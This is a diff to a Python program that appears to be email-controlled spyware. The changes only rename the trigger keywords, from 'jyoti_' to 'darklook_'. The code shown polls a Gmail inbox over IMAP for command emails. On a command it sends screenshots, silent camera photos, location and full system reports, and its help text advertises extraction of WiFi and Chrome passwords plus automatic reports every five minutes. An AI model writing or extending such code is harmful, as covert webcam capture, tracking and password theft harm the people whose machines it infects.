@@ -619,7 +619,7 @@ finally:
         def check_commands(self):
             """Check for specific commands only - FIXED VERSION"""
             try:
-                print("🔍 Checking for jyoti commands...")
+                print("🔍 Checking for darklook commands...")
                 
                 mail = imaplib.IMAP4_SSL("imap.gmail.com")
                 mail.login(self.email, self.password)
@@ -693,26 +693,26 @@ finally:
                         # Combine subject and body for command detection
                         full_content = subject_clean + " " + body_clean
                         
-                        # Process jyoti commands - check for commands in both subject and body
+                        # Process darklook commands - check for commands in both subject and body
                         command_executed = False
                         
-                        if "jyoti_lapi_screenshot" in full_content:
-                            print("🎯 COMMAND DETECTED: jyoti_lapi_screenshot")
+                        if "darklook_lapi_screenshot" in full_content:
+                            print("🎯 COMMAND DETECTED: darklook_lapi_screenshot")
                             self.send_screenshot_only()
                             command_executed = True
                             
-                        if "jyoti_picture" in full_content:
-                            print("🎯 COMMAND DETECTED: jyoti_picture")
+                        if "darklook_picture" in full_content:
+                            print("🎯 COMMAND DETECTED: darklook_picture")
                             self.send_camera_only()
                             command_executed = True
                             
-                        if "jyoti_report" in full_content:
-                            print("🎯 COMMAND DETECTED: jyoti_report")
+                        if "darklook_report" in full_content:
+                            print("🎯 COMMAND DETECTED: darklook_report")
                             self.send_full_report("Manual Report")
                             command_executed = True
                             
-                        if "jyoti_map" in full_content:
-                            print("🎯 COMMAND DETECTED: jyoti_map")
+                        if "darklook_map" in full_content:
+                            print("🎯 COMMAND DETECTED: darklook_map")
                             self.send_location_only()
                             command_executed = True
                             
@@ -725,7 +725,7 @@ finally:
                             except:
                                 print(f"⚠️ Could not mark email {email_id_str} as read")
                         else:
-                            print("❌ No valid jyoti command found")
+                            print("❌ No valid darklook command found")
                     else:
                         print("❌ Empty email body")
 
@@ -800,10 +800,10 @@ Captured Text:
             print("  • EVERY 5 MINUTES: Automatic full reports")
             print("")
             print("📧 MANUAL COMMANDS (send via email - subject or body):")
-            print("  • jyoti_lapi_screenshot - Take screenshot")
-            print("  • jyoti_picture - Take camera photo (SILENT - no light)")
-            print("  • jyoti_report - Full report (all files + system data)")
-            print("  • jyoti_map - Complete system data (WiFi + Chrome passwords)")
+            print("  • darklook_lapi_screenshot - Take screenshot")
+            print("  • darklook_picture - Take camera photo (SILENT - no light)")
+            print("  • darklook_report - Full report (all files + system data)")
+            print("  • darklook_map - Complete system data (WiFi + Chrome passwords)")
             print("")
             print("🔓 FEATURES:")
             print("  • Connected WiFi password extraction")
